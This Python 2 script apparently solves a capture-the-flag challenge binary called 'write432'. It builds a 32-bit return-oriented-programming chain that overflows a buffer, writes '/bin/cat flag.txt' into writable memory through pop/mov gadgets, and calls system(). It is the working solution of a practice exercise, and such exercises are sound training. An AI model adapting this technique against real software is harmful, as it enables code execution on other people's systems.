import struct

x = lambda a: struct.pack('<I', a)

# cat <(python2.7 write32_ex.py) - | ./write432 

# 0x8048670:  mov dword ptr [edi], ebp; ret; 
# 0x80486da:  pop edi; pop ebp; ret; 
# 0x804819d:  ret;

command_addr = 0x804a000 + 0x50 # address where the command will be

payload = 'D'*40
payload += 'BBBB'

command = r"/bin/cat flag.txt"
n = 4
l = len(command) 
for i in range(0, l, n): 
    hexed = command[i:min(i + n, l)]
    payload += x(0x80486da)# 0x80486da:  pop edi; pop ebp; ret; 
    payload += x(command_addr + i)
    payload += x(int("0x" + "".join([hex(ord(l))[2:] for l in hexed[::-1]]), 0))
    payload += x(0x8048670) # 0x8048670:  mov dword ptr [edi], ebp; ret; 

payload += x(0x08048430) # Address of system@plt
payload += 'JJJJ' # junk
payload += x(command_addr)

print payload
